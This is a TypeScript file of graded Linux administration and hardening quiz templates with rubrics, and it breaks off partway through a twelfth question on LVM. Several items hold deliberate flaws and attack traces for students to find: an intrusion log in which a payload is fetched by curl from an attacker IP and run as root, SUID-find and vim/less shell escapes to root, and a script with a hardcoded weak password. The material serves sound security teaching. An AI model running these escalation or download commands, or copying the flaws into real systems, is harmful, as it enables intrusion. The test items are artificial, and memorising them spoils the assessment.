import type { QuestionTemplate } from "../types";

export const LINUX_INFRA_TEMPLATES: QuestionTemplate[] = [
// --- linux-admin (Linux administration & hardening) ---

// 1. systemd services - predict_output - difficulty 1
{
  competencyId: "linux-admin",
  subTopic: "systemd-units",
  questionType: "predict_output",
  difficulty: 1,
  questionText: `A junior admin creates a custom service file and runs these commands:

\`\`\`ini
# /etc/systemd/system/beacon.service
[Unit]
Description=Beacon Agent
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/opt/beacon/agent --daemon
Restart=on-failure
RestartSec=5
User=beacon
Group=beacon

[Install]
WantedBy=multi-user.target
\`\`\`

\`\`\`bash
sudo cp beacon.service /etc/systemd/system/
sudo systemctl start beacon.service
sudo systemctl status beacon.service
# Output shows: Active: active (running)
sudo reboot
# After reboot:
sudo systemctl status beacon.service
\`\`\`

What will the status show after the reboot, and why? What single command was missed?`,
  rubric: {
    maxScore: 6,
    criteria: [
      {
        id: "inactive-state",
        description: "Identifies the service will be inactive/dead after reboot",
        points: 2,
        keywords: ["inactive", "dead", "not running", "stopped", "disabled"],
        check: "Student states the service will NOT be running after reboot"
      },
      {
        id: "enable-missing",
        description: "Identifies that systemctl enable was not run",
        points: 2,
        keywords: ["enable", "systemctl enable", "enabled"],
        check: "Student identifies the missing 'systemctl enable beacon.service' command"
      },
      {
        id: "symlink-explanation",
        description: "Explains the enable/symlink mechanism",
        points: 2,
        keywords: ["symlink", "WantedBy", "multi-user.target", "wants", "/etc/systemd/system/multi-user.target.wants"],
        check: "Student explains that enable creates a symlink in the target's wants directory"
      }
    ],
    gaps: [
      { if_missing: "inactive-state", gap: "systemd-service-lifecycle" },
      { if_missing: "enable-missing", gap: "systemd-enable-vs-start" },
      { if_missing: "symlink-explanation", gap: "systemd-unit-dependency-resolution" }
    ]
  }
},

// 2. file permissions SUID/SGID - spot_vuln - difficulty 2
{
  competencyId: "linux-admin",
  subTopic: "suid-sgid-permissions",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText: `During a hardening audit you run the following and get this output:

\`\`\`bash
$ find / -type f -perm -4000 -exec ls -la {} \\; 2>/dev/null
-rwsr-xr-x 1 root root  63568 Feb 10 10:15 /usr/bin/passwd
-rwsr-xr-x 1 root root  44528 Feb 10 10:15 /usr/bin/chsh
-rwsr-xr-x 1 root root  88464 Feb 10 10:15 /usr/bin/gpasswd
-rwsr-xr-x 1 root root  68208 Feb 10 10:15 /usr/bin/su
-rwsr-xr-x 1 root root 163448 Feb 10 10:15 /usr/bin/sudo
-rwsr-xr-x 1 root root  39144 Feb 10 10:15 /usr/bin/newgrp
-rwsr-xr-x 1 root root  85064 Feb 10 10:15 /usr/bin/find
-rwsr-xr-x 1 root root  14888 Feb 10 10:15 /opt/tools/backup-agent
-rwsr-sr-x 1 root shadow 22768 Feb 10 10:15 /opt/tools/shadow-reader
\`\`\`

Identify the security issues in this output. For each issue, explain the risk and how an attacker could exploit it.`,
  rubric: {
    maxScore: 8,
    criteria: [
      {
        id: "find-suid",
        description: "Identifies SUID on /usr/bin/find as critical risk",
        points: 2,
        keywords: ["find", "SUID", "-exec", "privilege escalation", "GTFOBins", "shell"],
        check: "Student identifies SUID find as exploitable (e.g., find . -exec /bin/sh -p \\;)"
      },
      {
        id: "backup-agent-risk",
        description: "Flags custom SUID binary in /opt as suspicious",
        points: 2,
        keywords: ["backup-agent", "/opt", "custom", "unverified", "unknown binary", "third-party"],
        check: "Student identifies the custom SUID binary as a risk since it is not a standard system utility"
      },
      {
        id: "shadow-reader-risk",
        description: "Flags shadow-reader with both SUID and SGID on shadow group",
        points: 2,
        keywords: ["shadow-reader", "SGID", "shadow", "password hashes", "/etc/shadow", "crack"],
        check: "Student identifies SUID+SGID shadow-reader gives access to /etc/shadow contents"
      },
      {
        id: "remediation",
        description: "Suggests concrete remediation steps",
        points: 2,
        keywords: ["chmod", "u-s", "remove SUID", "capabilities", "cap_", "setcap", "audit"],
        check: "Student suggests removing SUID bits and/or using Linux capabilities as alternatives"
      }
    ],
    gaps: [
      { if_missing: "find-suid", gap: "suid-binary-exploitation-gtfobins" },
      { if_missing: "backup-agent-risk", gap: "custom-suid-binary-auditing" },
      { if_missing: "shadow-reader-risk", gap: "sgid-shadow-group-implications" },
      { if_missing: "remediation", gap: "linux-capabilities-vs-suid" }
    ]
  }
},

// 3. cron - predict_output - difficulty 2
{
  competencyId: "linux-admin",
  subTopic: "cron-scheduling",
  questionType: "predict_output",
  difficulty: 2,
  questionText: `An admin sets up the following cron jobs. Examine them and predict what happens:

\`\`\`bash
# /etc/crontab
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/5 * * * *   root   /opt/scripts/health-check.sh >> /var/log/health.log 2>&1
0 2 * * *     root   /usr/bin/certbot renew --quiet
0 * * * *     backup /opt/scripts/db-backup.sh

# User 'deploy' runs:
$ crontab -e
# adds:
0 3 * * * cd /opt/app && git pull && systemctl restart app
\`\`\`

\`\`\`bash
# /opt/scripts/db-backup.sh
#!/bin/sh
mysqldump -u backup_user mydb | gzip > /backups/db-$(date +%Y%m%d_%H%M).sql.gz
find /backups -name "*.sql.gz" -mtime +7 -delete
\`\`\`

There are at least 3 problems that will cause failures or unexpected behavior. Identify them and predict the consequences.`,
  rubric: {
    maxScore: 8,
    criteria: [
      {
        id: "deploy-path",
        description: "Identifies that deploy user's crontab has minimal PATH",
        points: 2,
        keywords: ["PATH", "git", "systemctl", "not found", "absolute path", "user crontab"],
        check: "Student identifies user crontab doesn't inherit /etc/crontab PATH and git/systemctl may not be found"
      },
      {
        id: "deploy-permissions",
        description: "Identifies deploy user cannot restart systemd services",
        points: 2,
        keywords: ["permission", "privilege", "systemctl", "polkit", "root", "sudo", "denied"],
        check: "Student identifies that 'deploy' user lacks privileges to run systemctl restart"
      },
      {
        id: "backup-no-creds",
        description: "Identifies mysqldump password handling issue",
        points: 2,
        keywords: ["password", "credential", ".my.cnf", "mysql", "auth", "-p", "insecure"],
        check: "Student identifies that mysqldump will fail or prompt for password with no TTY"
      },
      {
        id: "timing-conflict",
        description: "Identifies potential git pull during backup window or other timing issue",
        points: 2,
        keywords: ["timing", "overlap", "backup", "race", "2 AM", "3 AM", "concurrent"],
        check: "Student identifies at least one timing or operational concern with the schedule"
      }
    ],
    gaps: [
      { if_missing: "deploy-path", gap: "cron-environment-variables" },
      { if_missing: "deploy-permissions", gap: "cron-user-privileges" },
      { if_missing: "backup-no-creds", gap: "mysql-credential-management-in-cron" },
      { if_missing: "timing-conflict", gap: "cron-job-scheduling-conflicts" }
    ]
  }
},

// 4. sudo configuration - spot_vuln - difficulty 2
{
  competencyId: "linux-admin",
  subTopic: "sudo-configuration",
  questionType: "spot_vuln",
  difficulty: 2,
  questionText: `Review this sudoers configuration and identify all security issues:

\`\`\`bash
# /etc/sudoers.d/dev-team
%developers ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart app-*
%developers ALL=(ALL) NOPASSWD: /usr/bin/journalctl
%developers ALL=(ALL) NOPASSWD: /usr/bin/docker exec *
%developers ALL=(ALL) NOPASSWD: /usr/bin/vim /etc/nginx/sites-available/*
%developers ALL=(ALL) NOPASSWD: /usr/bin/less /var/log/*

# Service account
svc_deploy ALL=(ALL) NOPASSWD: ALL
\`\`\`

Identify each vulnerability, explain why it is dangerous, and describe how an attacker who compromises a developer account could escalate privileges.`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "vim-escape",
        description: "Identifies vim allows shell escape to root",
        points: 2,
        keywords: ["vim", ":!", "shell escape", ":shell", ":term", "editor", "root shell"],
        check: "Student explains that vim with sudo allows :!bash or :shell to get a root shell"
      },
      {
        id: "docker-exec-root",
        description: "Identifies docker exec with wildcard gives root-equivalent access",
        points: 2,
        keywords: ["docker exec", "root", "container", "mount", "host filesystem", "escape", "namespace"],
        check: "Student explains docker exec * allows running any command in any container, often as root"
      },
      {
        id: "less-shell",
        description: "Identifies less allows shell escape via !command",
        points: 2,
        keywords: ["less", "!", "shell", "escape", "pager"],
        check: "Student identifies that less with sudo allows shell escape using !command syntax"
      },
      {
        id: "wildcard-abuse",
        description: "Identifies wildcard issues in systemctl or path specifications",
        points: 2,
        keywords: ["wildcard", "glob", "app-*", "path traversal", "../", "symlink"],
        check: "Student identifies wildcard patterns could be abused (e.g., creating services named app-malicious)"
      },
      {
        id: "svc-deploy-nopasswd-all",
        description: "Identifies service account with full NOPASSWD ALL as excessive",
        points: 2,
        keywords: ["svc_deploy", "NOPASSWD: ALL", "excessive", "principle of least privilege", "overprivileged"],
        check: "Student flags the service account with unrestricted NOPASSWD sudo as dangerous"
      }
    ],
    gaps: [
      { if_missing: "vim-escape", gap: "sudo-shell-escape-via-editors" },
      { if_missing: "docker-exec-root", gap: "docker-privilege-escalation-via-sudo" },
      { if_missing: "less-shell", gap: "sudo-shell-escape-via-pagers" },
      { if_missing: "wildcard-abuse", gap: "sudo-wildcard-path-abuse" },
      { if_missing: "svc-deploy-nopasswd-all", gap: "sudo-least-privilege-principle" }
    ]
  }
},

// 5. iptables/nftables - trace_explain - difficulty 3
{
  competencyId: "linux-admin",
  subTopic: "iptables-nftables",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `A server has the following iptables rules. An HTTP request arrives from 203.0.113.50 destined for port 443, and a separate SSH attempt arrives from 10.0.0.15 to port 22. Trace each packet through the rules and explain the outcome.

\`\`\`bash
$ sudo iptables -L INPUT -n -v --line-numbers
Chain INPUT (policy DROP)
num   target     prot opt in     out     source               destination
1     ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0
2     ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            ctstate RELATED,ESTABLISHED
3     DROP       tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:22 ctstate NEW recent: CHECK seconds: 60 hit_count: 4 name: sshbrute
4     ACCEPT     tcp  --  *      *       10.0.0.0/8           0.0.0.0/0            tcp dpt:22 ctstate NEW recent: SET name: sshbrute
5     ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:443 ctstate NEW
6     ACCEPT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            tcp dpt:80 ctstate NEW
7     LOG        all  --  *      *       0.0.0.0/0            0.0.0.0/0            LOG flags 0 level 4 prefix "IPT-DROP: "
8     DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0
\`\`\`

For each packet:
1. List which rules are evaluated and in what order
2. State the final verdict (ACCEPT/DROP)
3. Explain the SSH rate-limiting mechanism implemented by rules 3 and 4`,
  rubric: {
    maxScore: 8,
    criteria: [
      {
        id: "https-trace",
        description: "Correctly traces the HTTPS packet to rule 5 ACCEPT",
        points: 2,
        keywords: ["rule 5", "443", "ACCEPT", "ctstate NEW", "203.0.113.50"],
        check: "Student traces: rule 1 (not loopback, skip) -> rule 2 (not established, skip) -> rule 3 (not port 22, skip) -> rule 4 (not port 22, skip) -> rule 5 (matches port 443 NEW, ACCEPT)"
      },
      {
        id: "ssh-trace",
        description: "Correctly traces the SSH packet through rules 3 and 4",
        points: 2,
        keywords: ["rule 3", "rule 4", "22", "10.0.0.0/8", "sshbrute", "recent"],
        check: "Student traces: rule 1 (skip) -> rule 2 (skip) -> rule 3 (port 22 matches, checks recent list, first attempt so not hit_count 4, no match) -> rule 4 (port 22 + 10.0.0.0/8 matches, SET adds to recent list, ACCEPT)"
      },
      {
        id: "rate-limit-mechanism",
        description: "Explains the SSH brute-force protection logic",
        points: 2,
        keywords: ["recent", "rate limit", "brute force", "60 seconds", "4 attempts", "hit_count", "threshold"],
        check: "Student explains: rule 3 checks if source IP has 4+ connection attempts in 60s and DROPs if so; rule 4 records each new SSH attempt in the tracking table"
      },
      {
        id: "rule-order-significance",
        description: "Explains why rule 3 must come before rule 4",
        points: 2,
        keywords: ["order", "before", "check before set", "first-match", "sequential"],
        check: "Student explains that rule 3 (CHECK) must precede rule 4 (SET) so the rate limit is evaluated before the connection is accepted and counted"
      }
    ],
    gaps: [
      { if_missing: "https-trace", gap: "iptables-rule-evaluation-order" },
      { if_missing: "ssh-trace", gap: "iptables-recent-module-matching" },
      { if_missing: "rate-limit-mechanism", gap: "iptables-recent-module-rate-limiting" },
      { if_missing: "rule-order-significance", gap: "iptables-rule-ordering-logic" }
    ]
  }
},

// 6. SSH hardening - fix_code - difficulty 3
{
  competencyId: "linux-admin",
  subTopic: "ssh-hardening",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `This SSH server configuration was written by an intern. It has multiple security issues. Fix the configuration and explain each change:

\`\`\`ini
# /etc/ssh/sshd_config
Port 22
Protocol 2
PermitRootLogin yes
PasswordAuthentication yes
PubkeyAuthentication yes
PermitEmptyPasswords no
X11Forwarding yes
MaxAuthTries 10
LoginGraceTime 120
UsePAM yes
AllowAgentForwarding yes
AllowTcpForwarding yes
ClientAliveInterval 0
ClientAliveCountMax 3
Banner none
LogLevel INFO
Subsystem sftp /usr/lib/openssh/sftp-server
# Note: fail2ban is not installed
\`\`\`

The server is an internet-facing bastion host used by 5 admins who all have SSH keys. Provide the corrected configuration and explain your security rationale for each change.`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "root-login",
        description: "Disables root login or restricts to prohibit-password",
        points: 2,
        keywords: ["PermitRootLogin", "no", "prohibit-password", "without-password", "root"],
        check: "Student sets PermitRootLogin to 'no' or 'prohibit-password' with explanation"
      },
      {
        id: "password-auth",
        description: "Disables password authentication since all admins have keys",
        points: 2,
        keywords: ["PasswordAuthentication", "no", "key-only", "pubkey", "brute force"],
        check: "Student disables password auth given all admins have SSH keys"
      },
      {
        id: "max-auth-session",
        description: "Reduces MaxAuthTries and sets session timeouts",
        points: 2,
        keywords: ["MaxAuthTries", "3", "4", "ClientAliveInterval", "timeout", "idle", "LoginGraceTime"],
        check: "Student reduces MaxAuthTries (3-6), sets ClientAliveInterval > 0, and reduces LoginGraceTime"
      },
      {
        id: "forwarding-restrictions",
        description: "Disables unnecessary forwarding on a bastion host",
        points: 2,
        keywords: ["X11Forwarding", "AllowTcpForwarding", "AllowAgentForwarding", "no", "forwarding", "tunnel"],
        check: "Student disables X11Forwarding and restricts TCP/Agent forwarding with rationale"
      },
      {
        id: "additional-hardening",
        description: "Adds at least two additional hardening measures",
        points: 2,
        keywords: ["AllowUsers", "AllowGroups", "Port", "non-standard", "Banner", "LogLevel VERBOSE", "fail2ban", "ChrootDirectory", "KexAlgorithms", "Ciphers", "MACs"],
        check: "Student adds measures like AllowUsers/AllowGroups, non-standard port, VERBOSE logging, cipher restrictions, or mentions fail2ban"
      }
    ],
    gaps: [
      { if_missing: "root-login", gap: "ssh-root-login-risks" },
      { if_missing: "password-auth", gap: "ssh-key-vs-password-authentication" },
      { if_missing: "max-auth-session", gap: "ssh-brute-force-mitigation" },
      { if_missing: "forwarding-restrictions", gap: "ssh-forwarding-attack-surface" },
      { if_missing: "additional-hardening", gap: "ssh-defense-in-depth" }
    ]
  }
},

// 7. PAM - trace_explain - difficulty 3
{
  competencyId: "linux-admin",
  subTopic: "pam-authentication",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `Examine this PAM configuration for a custom service and trace what happens when user 'operator' (who is in the 'wheel' group) attempts to authenticate with the correct password:

\`\`\`bash
# /etc/pam.d/custom-app
auth     required       pam_faildelay.so   delay=3000000
auth     required       pam_env.so
auth     requisite      pam_group.so       group=wheel
auth     sufficient     pam_unix.so        try_first_pass nullok
auth     required       pam_deny.so

account  required       pam_unix.so
account  required       pam_time.so

session  required       pam_limits.so
session  optional       pam_umask.so       umask=0077

# /etc/security/time.conf
custom-app;*;operator;!Wk0800-1800
\`\`\`

Trace the authentication flow step by step. Then explain what would change if:
1. The user is NOT in the wheel group
2. The 'requisite' keyword on pam_group.so were changed to 'required'`,
  rubric: {
    maxScore: 8,
    criteria: [
      {
        id: "auth-stack-trace",
        description: "Correctly traces the auth stack for the happy path",
        points: 2,
        keywords: ["pam_faildelay", "pam_env", "pam_group", "wheel", "pam_unix", "sufficient", "success"],
        check: "Student traces each module in order: faildelay sets delay, env loads vars, group checks wheel membership (pass), unix checks password (pass + sufficient = stack succeeds), pam_deny never reached"
      },
      {
        id: "requisite-vs-required",
        description: "Explains the difference between requisite and required",
        points: 2,
        keywords: ["requisite", "immediate", "fail", "stop", "required", "continue", "all modules"],
        check: "Student explains requisite causes immediate failure (stops processing), while required marks failure but continues evaluating remaining modules"
      },
      {
        id: "non-wheel-scenario",
        description: "Correctly predicts behavior when user is not in wheel",
        points: 2,
        keywords: ["requisite", "immediate", "denied", "pam_group fails", "stops"],
        check: "Student correctly states pam_group fails -> requisite causes immediate auth failure, remaining auth modules not evaluated"
      },
      {
        id: "time-conf-explanation",
        description: "Explains the time.conf restriction on the operator account",
        points: 2,
        keywords: ["time.conf", "Wk", "weekday", "0800", "1800", "denied", "outside", "business hours", "account"],
        check: "Student explains the ! negation means operator is DENIED during weekdays 8am-6pm (or correctly interprets the time restriction)"
      }
    ],
    gaps: [
      { if_missing: "auth-stack-trace", gap: "pam-module-stack-evaluation" },
      { if_missing: "requisite-vs-required", gap: "pam-control-flags" },
      { if_missing: "non-wheel-scenario", gap: "pam-requisite-short-circuit" },
      { if_missing: "time-conf-explanation", gap: "pam-time-based-access-control" }
    ]
  }
},

// 8. log analysis - trace_explain - difficulty 3
{
  competencyId: "linux-admin",
  subTopic: "log-analysis",
  questionType: "trace_explain",
  difficulty: 3,
  questionText: `You are investigating a suspected intrusion. Analyze these log entries and reconstruct the attack timeline:

\`\`\`
# /var/log/auth.log
Jul 15 03:12:01 web01 sshd[4521]: Failed password for invalid user admin from 198.51.100.23 port 44312 ssh2
Jul 15 03:12:03 web01 sshd[4523]: Failed password for invalid user admin from 198.51.100.23 port 44318 ssh2
Jul 15 03:12:05 web01 sshd[4525]: Failed password for root from 198.51.100.23 port 44322 ssh2
[... 200 similar lines over 8 minutes ...]
Jul 15 03:20:44 web01 sshd[4891]: Accepted password for deploy from 198.51.100.23 port 44998 ssh2
Jul 15 03:20:44 web01 sshd[4891]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
Jul 15 03:21:02 web01 sudo[4923]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt update
Jul 15 03:21:15 web01 sudo[4935]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/.x http://198.51.100.23:8080/payload
Jul 15 03:21:18 web01 sudo[4941]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/chmod +x /tmp/.x
Jul 15 03:21:19 web01 sudo[4943]: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/tmp/.x
Jul 15 03:22:01 web01 sshd[4960]: Accepted publickey for root from 198.51.100.23 port 45012 ssh2
Jul 15 03:22:05 web01 useradd[4975]: new user: name=support, UID=0, GID=0, home=/root, shell=/bin/bash
\`\`\`

\`\`\`
# /var/log/syslog
Jul 15 03:22:30 web01 systemd[1]: Started /tmp/.x - System Health Monitor.
\`\`\`

Reconstruct the full attack chain. What technique was used at each stage? What evidence of persistence do you see?`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "brute-force-identification",
        description: "Identifies initial brute-force SSH attack on multiple usernames",
        points: 2,
        keywords: ["brute force", "password spray", "dictionary", "invalid user", "multiple attempts", "8 minutes"],
        check: "Student identifies the initial SSH brute-force/password-spraying phase from 198.51.100.23"
      },
      {
        id: "credential-compromise",
        description: "Identifies successful login via compromised deploy account",
        points: 2,
        keywords: ["deploy", "Accepted password", "compromised", "weak password", "credential"],
        check: "Student identifies the deploy account was compromised via password authentication"
      },
      {
        id: "privilege-escalation",
        description: "Traces the privilege escalation through sudo abuse",
        points: 2,
        keywords: ["sudo", "curl", "payload", "download", "chmod", "execute", "privilege escalation", "root"],
        check: "Student traces: deploy uses sudo to download a payload, make it executable, and run it as root"
      },
      {
        id: "persistence-mechanisms",
        description: "Identifies all persistence mechanisms",
        points: 2,
        keywords: ["SSH key", "publickey", "root login", "UID=0", "support user", "backdoor", "systemd service", "persistence"],
        check: "Student identifies: (1) SSH key added for root access, (2) new user 'support' with UID 0 (root-equivalent), (3) malware registered as systemd service"
      },
      {
        id: "ioc-extraction",
        description: "Identifies indicators of compromise for incident response",
        points: 2,
        keywords: ["198.51.100.23", "IOC", "/tmp/.x", "indicator", "C2", "payload URL", "port 8080"],
        check: "Student extracts IOCs: attacker IP, payload URL, dropped file path, and/or backdoor account"
      }
    ],
    gaps: [
      { if_missing: "brute-force-identification", gap: "ssh-brute-force-log-patterns" },
      { if_missing: "credential-compromise", gap: "auth-log-analysis-techniques" },
      { if_missing: "privilege-escalation", gap: "sudo-abuse-detection" },
      { if_missing: "persistence-mechanisms", gap: "linux-persistence-techniques" },
      { if_missing: "ioc-extraction", gap: "incident-response-ioc-extraction" }
    ]
  }
},

// 9. user/group management - fix_code - difficulty 3
{
  competencyId: "linux-admin",
  subTopic: "user-group-management",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `A script was written to onboard a new developer. It has several security and functional issues. Fix the script and explain each problem:

\`\`\`bash
#!/bin/bash
# onboard-dev.sh - Set up new developer account
USERNAME=$1

# Create user
useradd $USERNAME
echo "$USERNAME:Welcome123!" | chpasswd

# Add to groups
usermod -G docker,developers $USERNAME

# Set up home directory
cp -r /etc/skel/. /home/$USERNAME/
chmod 777 /home/$USERNAME

# Create their project workspace
mkdir /srv/projects/$USERNAME
chown $USERNAME /srv/projects/$USERNAME

# Set up SSH access
mkdir /home/$USERNAME/.ssh
cp /tmp/authorized_keys /home/$USERNAME/.ssh/
chmod 644 /home/$USERNAME/.ssh/authorized_keys

# Add sudo for docker management
echo "$USERNAME ALL=(ALL) NOPASSWD: /usr/bin/docker" >> /etc/sudoers

# Done
echo "User $USERNAME created with password Welcome123!"
\`\`\`

Identify all issues (security, correctness, and best practices) and provide the fixed version.`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "input-validation",
        description: "Adds input validation and quoting for the username variable",
        points: 2,
        keywords: ["validate", "quote", "\"$USERNAME\"", "injection", "empty", "check", "sanitize"],
        check: "Student identifies the unquoted variable is vulnerable to injection/word-splitting and adds validation"
      },
      {
        id: "password-handling",
        description: "Identifies weak default password and insecure password handling",
        points: 2,
        keywords: ["Welcome123", "weak", "default password", "chpasswd", "expire", "chage", "force change", "echo", "process list"],
        check: "Student identifies the weak default password, password visible in echo output, and suggests forcing password change on first login"
      },
      {
        id: "group-overwrite",
        description: "Identifies usermod -G (without -a) overwrites existing groups",
        points: 2,
        keywords: ["-aG", "-a", "append", "overwrite", "replace", "existing groups"],
        check: "Student identifies that -G without -a flag replaces all secondary groups instead of appending"
      },
      {
        id: "permissions-fix",
        description: "Fixes home directory (777) and SSH directory permissions",
        points: 2,
        keywords: ["777", "700", "750", "chmod", ".ssh", "600", "authorized_keys", "ownership"],
        check: "Student fixes home dir to 700/750, .ssh to 700, authorized_keys to 600, and fixes ownership"
      },
      {
        id: "sudoers-fix",
        description: "Fixes direct sudoers file editing to use visudo/sudoers.d",
        points: 2,
        keywords: ["visudo", "sudoers.d", "syntax check", "append", "corrupt", "/etc/sudoers"],
        check: "Student replaces direct >> append to /etc/sudoers with a sudoers.d drop-in file via visudo -c"
      }
    ],
    gaps: [
      { if_missing: "input-validation", gap: "bash-input-validation-security" },
      { if_missing: "password-handling", gap: "linux-password-policy-management" },
      { if_missing: "group-overwrite", gap: "usermod-group-append-flag" },
      { if_missing: "permissions-fix", gap: "linux-file-permission-best-practices" },
      { if_missing: "sudoers-fix", gap: "sudoers-safe-editing-practices" }
    ]
  }
},

// 10. sysctl kernel parameters - fix_code - difficulty 3
{
  competencyId: "linux-admin",
  subTopic: "sysctl-kernel-hardening",
  questionType: "fix_code",
  difficulty: 3,
  questionText: `A hardening guide recommends these sysctl settings for a web server. Some settings are wrong, missing rationale, or inappropriate for the stated use case. Identify issues and fix them:

\`\`\`bash
# /etc/sysctl.d/99-hardening.conf

# Network hardening
net.ipv4.ip_forward = 1
net.ipv4.conf.all.accept_redirects = 1
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.tcp_syncookies = 1
net.ipv4.conf.all.rp_filter = 0
net.ipv4.conf.all.log_martians = 1
net.ipv6.conf.all.accept_ra = 1

# Kernel hardening
kernel.sysrq = 1
kernel.randomize_va_space = 2
kernel.dmesg_restrict = 0
kernel.kptr_restrict = 0
kernel.yama.ptrace_scope = 0

# File system
fs.suid_dumpable = 2
fs.protected_hardlinks = 1
fs.protected_symlinks = 1
\`\`\`

This is a standalone web server (not a router/gateway). For each incorrect setting, explain the security implication and provide the correct value.`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "ip-forward",
        description: "Identifies ip_forward should be 0 for a non-router",
        points: 2,
        keywords: ["ip_forward", "0", "router", "forwarding", "not a gateway", "routing"],
        check: "Student identifies ip_forward=1 is wrong for a standalone web server and should be 0"
      },
      {
        id: "accept-redirects",
        description: "Identifies accept_redirects and accept_ra should be disabled",
        points: 2,
        keywords: ["accept_redirects", "0", "MITM", "accept_ra", "router advertisement", "redirect"],
        check: "Student identifies ICMP redirects (accept_redirects=1) and IPv6 RA (accept_ra=1) should be disabled"
      },
      {
        id: "rp-filter",
        description: "Identifies reverse path filtering should be enabled",
        points: 2,
        keywords: ["rp_filter", "1", "2", "reverse path", "spoofing", "anti-spoof"],
        check: "Student identifies rp_filter=0 disables anti-spoofing and should be 1 (strict) or 2 (loose)"
      },
      {
        id: "kernel-exposure",
        description: "Identifies kernel information exposure settings",
        points: 2,
        keywords: ["dmesg_restrict", "kptr_restrict", "ptrace_scope", "kernel pointers", "ASLR", "information leak"],
        check: "Student identifies dmesg_restrict=0, kptr_restrict=0, and ptrace_scope=0 all leak kernel information and should be restricted (1 or 2)"
      },
      {
        id: "suid-sysrq",
        description: "Identifies suid_dumpable and sysrq risks",
        points: 2,
        keywords: ["suid_dumpable", "0", "core dump", "sysrq", "magic sysrq", "credentials"],
        check: "Student identifies suid_dumpable=2 allows core dumps of SUID programs (credential leak) and sysrq=1 enables all SysRq keys"
      }
    ],
    gaps: [
      { if_missing: "ip-forward", gap: "sysctl-network-routing-hardening" },
      { if_missing: "accept-redirects", gap: "sysctl-icmp-redirect-hardening" },
      { if_missing: "rp-filter", gap: "sysctl-anti-spoofing-reverse-path" },
      { if_missing: "kernel-exposure", gap: "sysctl-kernel-information-leakage" },
      { if_missing: "suid-sysrq", gap: "sysctl-suid-coredump-sysrq-hardening" }
    ]
  }
},

// 11. SELinux vs AppArmor - compare_contrast - difficulty 4
{
  competencyId: "linux-admin",
  subTopic: "selinux-apparmor",
  questionType: "compare_contrast",
  difficulty: 4,
  questionText: `You are deploying a custom web application on two servers:
- Server A runs RHEL 9 with SELinux enforcing
- Server B runs Ubuntu 22.04 with AppArmor enabled

The application is a Python Flask app that:
- Listens on port 8080
- Reads configuration from /opt/app/config/
- Writes logs to /var/log/app/
- Connects to a PostgreSQL database on port 5432
- Executes shell commands to process uploaded files in /tmp/app-uploads/

For each MAC system:
1. What problems will you encounter when deploying without any policy changes?
2. Show how you would create a custom policy/profile to allow the application to function
3. Compare the two approaches: which is more appropriate for this use case and why?`,
  rubric: {
    maxScore: 10,
    criteria: [
      {
        id: "selinux-issues",
        description: "Identifies specific SELinux denials the app would face",
        points: 2,
        keywords: ["selinux", "context", "type enforcement", "port_t", "AVC", "denied", "httpd_t", "label", "semanage", "audit2allow"],
        check: "Student identifies SELinux will block: non-standard port binding, file access in /opt, network connection to postgres, and /tmp execution"
      },
      {
        id: "apparmor-profile",
        description: "Shows understanding of AppArmor profile creation",
        points: 2,
        keywords: ["apparmor", "profile", "aa-genprof", "aa-complain", "aa-enforce", "/opt/app/config/ r", "deny", "capability"],
        check: "Student demonstrates creating an AppArmor profile with path-based rules for the application"
      },
      {
        id: "model-comparison",
        description: "Accurately compares the two security models",
        points: 2,
        keywords: ["type enforcement", "path-based", "label", "inode", "DAC", "MAC", "granularity", "complexity"],
        check: "Student explains SELinux uses label-based type enforcement vs AppArmor's path-based confinement model"
      },
      {
        id: "tradeoff-analysis",
        description: "Provides nuanced analysis of tradeoffs for this use case",
        points: 2,
        keywords: ["complexity", "learning curve", "maintenance", "flexibility", "policy", "custom application"],
        check: "Student discusses tradeoffs: SELinux more granular but complex, AppArmor simpler for custom apps but less comprehensive"
      },
      {
        id: "recommendation",
        description: "Makes a justified recommendation",
        points: 2,
        keywords: ["recommend", "because", "for this use case", "custom app", "easier", "appropriate"],
        check: "Student makes a reasoned recommendation with justification tied to the specific use case"
      }
    ],
    gaps: [
      { if_missing: "selinux-issues", gap: "selinux-type-enforcement-troubleshooting" },
      { if_missing: "apparmor-profile", gap: "apparmor-profile-creation" },
      { if_missing: "model-comparison", gap: "mac-framework-comparison" },
      { if_missing: "tradeoff-analysis", gap: "mac-tradeoff-analysis" },
      { if_missing: "recommendation", gap: "mac-framework-selection-criteria" }
    ]
  }
},

// 12. LVM disk management - design_solution - difficulty 4
{
  competencyId: "linux-admin",
  subTopic: "lvm-disk-management",
  questionType: "design_solution",
  difficulty: 4,
  questionText: `You are setting up a new server that will run a database (PostgreSQL), application logs, and user data. The server has:
- 2x 500GB NVMe SSDs (/dev/nvme0n1, /dev/nvme1n1)
- 2x 2TB HDDs (/dev/sda, /dev/sdb)
- 32GB RAM

Requirements:
- Database needs high IOPS and redundancy
- Logs should be isolated so they cannot fill up the root filesystem
- User uploads can be large but do not need high performance
- System should be recoverable from single disk failure
- Snapshots must be possible for database backups
- Root filesystem: 50GB minimum

